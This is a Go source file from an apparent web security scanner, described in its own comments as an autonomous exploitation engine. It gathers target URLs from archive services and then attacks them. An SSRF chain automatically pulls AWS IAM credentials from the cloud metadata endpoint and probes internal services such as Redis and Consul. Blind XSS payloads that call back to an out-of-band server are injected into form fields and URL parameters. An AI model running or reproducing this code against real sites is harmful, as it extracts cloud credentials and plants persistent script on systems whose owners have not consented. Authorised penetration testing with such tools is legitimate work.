package scanner

import (
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

// ==========================================================================
// BEYOND GODLY: Autonomous exploitation engine
// ==========================================================================

// --- Wayback/GAU URL Seeding ---
// Seeds the crawler with historical URLs from multiple OSINT sources

func scanWaybackSeed(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	sources := []struct {
		name string
		url  string
	}{
		{"Wayback", fmt.Sprintf("https://web.archive.org/cdx/search/cdx?url=%s/*&output=json&fl=original&collapse=urlkey&limit=500", cfg.Target)},
		{"OTX", fmt.Sprintf("https://otx.alienvault.com/api/v1/indicators/domain/%s/url_list?limit=200", cfg.Target)},
		{"URLScan", fmt.Sprintf("https://urlscan.io/api/v1/search/?q=domain:%s&size=100", cfg.Target)},
	}

	allURLs := make(map[string]bool)

	for _, src := range sources {
		wg.Add(1)
		go func(name, apiURL string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			resp := http.Get(apiURL)
			if resp.Err != nil || resp.StatusCode != 200 {
				return
			}

			var urls []string
			switch name {
			case "Wayback":
				var rows [][]string
				json.Unmarshal([]byte(resp.Body), &rows)
				for _, row := range rows {
					if len(row) > 0 && strings.HasPrefix(row[0], "http") {
						urls = append(urls, row[0])
					}
				}
			case "OTX":
				var data struct {
					URLList []struct{ URL string `json:"url"` } `json:"url_list"`
				}
				json.Unmarshal([]byte(resp.Body), &data)
				for _, u := range data.URLList {
					urls = append(urls, u.URL)
				}
			case "URLScan":
				var data struct {
					Results []struct{ Page struct{ URL string `json:"url"` } `json:"page"` } `json:"results"`
				}
				json.Unmarshal([]byte(resp.Body), &data)
				for _, r := range data.Results {
					urls = append(urls, r.Page.URL)
				}
			}

			mu.Lock()
			for _, u := range urls {
				allURLs[u] = true
			}
			mu.Unlock()
		}(src.name, src.url)
	}
	wg.Wait()

	// Filter interesting URLs and add params to crawl data
	interestingPatterns := regexp.MustCompile(`(?i)\.(php|asp|jsp|do|action|cgi)|[?&](id|user|file|path|url|redirect|token|key|page|query|search|cmd|exec)=`)
	var interesting []string

	for u := range allURLs {
		if interestingPatterns.MatchString(u) {
			interesting = append(interesting, u)
			// Extract params and add to crawl data
			parsed, err := url.Parse(u)
			if err == nil && parsed.RawQuery != "" {
				base := parsed.Scheme + "://" + parsed.Host + parsed.Path
				for k := range parsed.Query() {
					crawl.Params[base] = appendUnique(crawl.Params[base], k)
				}
			}
		}
	}

	// Probe interesting URLs to see if they're still alive
	alive := 0
	for _, u := range interesting[:min(50, len(interesting))] {
		resp := http.Get(u)
		if resp.Err == nil && resp.StatusCode == 200 {
			alive++
		}
	}

	if len(allURLs) > 0 {
		findings = append(findings, Finding{
			Type: "OSINT URL Seeding", Severity: "info",
			URL:    fmt.Sprintf("%d total, %d interesting, %d alive", len(allURLs), len(interesting), alive),
			Detail: fmt.Sprintf("Seeded %d params from Wayback/OTX/URLScan into scan pipeline", countParams(crawl.Params)),
			Template: "apex-osint-seed",
		})
	}
	return findings
}

// --- Autonomous Exploit Escalation ---
// When a finding is confirmed, automatically tries to escalate it

func scanAutoEscalate(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, oobClient *oob.Client) []Finding {
	var findings []Finding

	// Look for SSRF-able params and auto-escalate
	ssrfParams := []string{"url", "uri", "src", "fetch", "proxy", "dest", "redirect", "link", "callback", "webhook"}
	for u, params := range crawl.Params {
		for _, p := range params {
			if !containsAnyStr(strings.ToLower(p), ssrfParams) {
				continue
			}

			// Step 1: Confirm SSRF with canary
			canaryURL := "http://169.254.169.254/"
			testURL := injectParam(u, p, canaryURL)
			resp := http.Get(testURL)
			if resp.Err != nil || resp.StatusCode != 200 || len(resp.Body) < 10 {
				continue
			}

			// Step 2: Escalate — try to read IAM credentials
			iamURL := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
			testURL2 := injectParam(u, p, iamURL)
			resp2 := http.Get(testURL2)
			if resp2.Err != nil || resp2.StatusCode != 200 {
				continue
			}

			// Step 3: If we got a role name, fetch the actual credentials
			roleName := strings.TrimSpace(resp2.Body)
			if roleName != "" && !strings.Contains(roleName, "<") {
				credURL := iamURL + roleName
				testURL3 := injectParam(u, p, credURL)
				resp3 := http.Get(testURL3)
				if resp3.Err == nil && strings.Contains(resp3.Body, "AccessKeyId") {
					findings = append(findings, Finding{
						Type: "SSRF → Full AWS Credential Extraction", Severity: "critical",
						URL: testURL3, Param: p,
						Detail:   fmt.Sprintf("Extracted AWS credentials for role '%s' via SSRF chain", roleName),
						Template: "apex-ssrf-aws-full",
					})
				}
			}

			// Step 4: Try internal service exploitation
			internalServices := []struct{ url, name, detect string }{
				{"http://127.0.0.1:6379/INFO", "Redis", "redis_version"},
				{"http://127.0.0.1:9200/_cluster/health", "Elasticsearch", "cluster_name"},
				{"http://127.0.0.1:11211/stats", "Memcached", "STAT"},
				{"http://127.0.0.1:27017/", "MongoDB", ""},
				{"http://127.0.0.1:8500/v1/agent/self", "Consul", "Config"},
				{"http://127.0.0.1:2379/version", "etcd", "etcdserver"},
				{"http://127.0.0.1:9090/api/v1/targets", "Prometheus", "targets"},
				{"http://127.0.0.1:3000/api/org", "Grafana", ""},
				{"http://127.0.0.1:15672/api/overview", "RabbitMQ", ""},
				{"http://127.0.0.1:8080/manager/html", "Tomcat Manager", ""},
			}

			for _, svc := range internalServices {
				testURL := injectParam(u, p, svc.url)
				resp := http.Get(testURL)
				if resp.Err == nil && resp.StatusCode == 200 && (svc.detect == "" || strings.Contains(resp.Body, svc.detect)) && len(resp.Body) > 20 {
					findings = append(findings, Finding{
						Type: fmt.Sprintf("SSRF → Internal %s Access", svc.name), Severity: "critical",
						URL: testURL, Param: p,
						Detail:   fmt.Sprintf("Internal %s service accessible via SSRF — data extraction possible", svc.name),
						Template: "apex-ssrf-internal-" + strings.ToLower(svc.name),
					})
				}
			}
		}
	}
	return findings
}

// --- Blind XSS with Callback ---
// Injects blind XSS payloads that call back to OOB server when triggered

func scanBlindXSSCallback(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, oobClient *oob.Client) []Finding {
	var findings []Finding
	if oobClient == nil || !oobClient.Active() {
		return findings
	}

	uid := oobClient.GenerateUID()
	callbackURL := oobClient.PayloadURL(uid)

	blindPayloads := []string{
		fmt.Sprintf(`"><script src=%s></script>`, callbackURL),
		fmt.Sprintf(`<img src=x onerror="fetch('%s')">`, callbackURL),
		fmt.Sprintf(`'"><img src=%s>`, callbackURL),
		fmt.Sprintf(`javascript:fetch('%s')`, callbackURL),
	}

	// Inject into all input fields (especially name, email, comment, feedback, subject)
	blindTargetFields := []string{"name", "email", "subject", "message", "comment", "feedback", "title", "description", "bio", "about", "address", "company", "website", "url"}

	for _, form := range crawl.Forms {
		for _, inp := range form.Inputs {
			if !containsAnyStr(strings.ToLower(inp.Name), blindTargetFields) {
				continue
			}
			for _, payload := range blindPayloads {
				data := inp.Name + "=" + url.QueryEscape(payload)
				http.Post(form.Action, "application/x-www-form-urlencoded", data)
			}
		}
	}

	// Also inject via URL params
	for u, params := range crawl.Params {
		for _, p := range params {
			testURL := injectParam(u, p, blindPayloads[0])
			http.Get(testURL)
		}
	}

	// Wait and check for callbacks
	time.Sleep(5 * time.Second)
	if oobClient.Poll(uid, 10*time.Second) {
		findings = append(findings, Finding{
			Type: "Blind XSS (OOB Callback Confirmed)", Severity: "critical",
			URL:    "stored — triggered on admin/internal page",
			Detail: "Blind XSS payload executed and called back to OOB server. Likely triggered in admin panel, email viewer, or log viewer.",
			Template: "apex-blind-xss-confirmed",
		})
	}
	return findings
}

// --- API Schema Inference ---
// Infers API structure from observed endpoints and tests undocumented ones

func scanAPISchemaInference(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	// Collect API paths
	apiPaths := make(map[string]bool)
	for u := range crawl.Params {
		if strings.Contains(u, "/api/") || strings.Contains(u, "/v1/") || strings.Contains(u, "/v2/") {
			apiPaths[u] = true
		}
	}
	for _, page := range crawl.Pages {
		if strings.Contains(page.URL, "/api/") || strings.Contains(page.URL, "/v1/") || strings.Contains(page.URL, "/v2/") {
			apiPaths[page.URL] = true
		}
	}

	// Infer patterns: if /api/users exists, try /api/users/1, /api/users/admin, /api/users/me
	inferred := make(map[string]bool)
	for path := range apiPaths {
		parsed, _ := url.Parse(path)
		if parsed == nil {
			continue
		}
		base := parsed.Scheme + "://" + parsed.Host
		segments := strings.Split(strings.Trim(parsed.Path, "/"), "/")

		// Generate variations
		for i, seg := range segments {
			if seg == "api" || seg == "v1" || seg == "v2" || seg == "v3" {
				continue
			}
			// Try CRUD operations on the resource
			resourcePath := "/" + strings.Join(segments[:i+1], "/")
			inferred[base+resourcePath+"/1"] = true
			inferred[base+resourcePath+"/me"] = true
			inferred[base+resourcePath+"/admin"] = true
			inferred[base+resourcePath+"/all"] = true
			inferred[base+resourcePath+"/count"] = true
			inferred[base+resourcePath+"/export"] = true
			inferred[base+resourcePath+"/search"] = true
		}
	}

	// Probe inferred endpoints
	for endpoint := range inferred {
		if apiPaths[endpoint] {
			continue // Already known
		}
		wg.Add(1)
		go func(ep string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			resp := http.Get(ep)
			if resp.Err == nil && resp.StatusCode == 200 && len(resp.Body) > 20 {
				// Verify it's not a generic 200 page
				if strings.Contains(resp.Body, "{") || strings.Contains(resp.Body, "[") {
					mu.Lock()
					findings = append(findings, Finding{
						Type: "Undocumented API Endpoint", Severity: "medium",
						URL: ep, Detail: fmt.Sprintf("Inferred endpoint returns data (%d bytes)", len(resp.Body)),
						Template: "apex-api-inferred",
					})
					mu.Unlock()
				}
			}
		}(endpoint)
	}
	wg.Wait()
	return findings
}

// --- Response Header Analysis ---
// Deep analysis of response headers for security issues

func scanHeaderAnalysis(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}

	resp := http.Get(crawl.Pages[0].URL)
	if resp.Err != nil {
		return findings
	}

	// Check for debug/internal headers that leak info
	sensitiveHeaders := map[string]string{
		"X-Debug-Token":     "Debug token exposed",
		"X-Debug-Token-Link": "Debug profiler link exposed",
		"X-Powered-By":      "Technology stack disclosed",
		"Server":            "Server version disclosed",
		"X-AspNet-Version":  "ASP.NET version disclosed",
		"X-AspNetMvc-Version": "ASP.NET MVC version disclosed",
		"X-Runtime":         "Request processing time leaked (timing oracle)",
		"X-Request-Id":      "Request ID format may be predictable",
		"X-Amzn-Trace-Id":  "AWS trace ID exposed",
		"X-Cloud-Trace-Context": "GCP trace context exposed",
	}

	for header, issue := range sensitiveHeaders {
		val := resp.Headers.Get(header)
		if val != "" {
			sev := "info"
			if strings.Contains(header, "Debug") || strings.Contains(header, "Version") {
				sev = "low"
			}
			findings = append(findings, Finding{
				Type: "Header Leak: " + header, Severity: sev,
				URL: crawl.Pages[0].URL, Detail: fmt.Sprintf("%s: %s — %s", header, val, issue),
				Template: "apex-header-leak",
			})
		}
	}

	// Check CORS headers in detail
	acao := resp.Headers.Get("Access-Control-Allow-Origin")
	if acao == "*" {
		acac := resp.Headers.Get("Access-Control-Allow-Credentials")
		if acac == "true" {
			findings = append(findings, Finding{
				Type: "CORS: Wildcard + Credentials", Severity: "critical",
				URL: crawl.Pages[0].URL, Detail: "ACAO: * with credentials=true — universal cross-origin data theft",
				Template: "apex-cors-critical",
			})
		}
	}

	return findings
}

// --- Helpers ---

func appendUnique(slice []string, item string) []string {
	for _, s := range slice {
		if s == item {
			return slice
		}
	}
	return append(slice, item)
}

func countParams(params map[string][]string) int {
	total := 0
	for _, ps := range params {
		total += len(ps)
	}
	return total
}
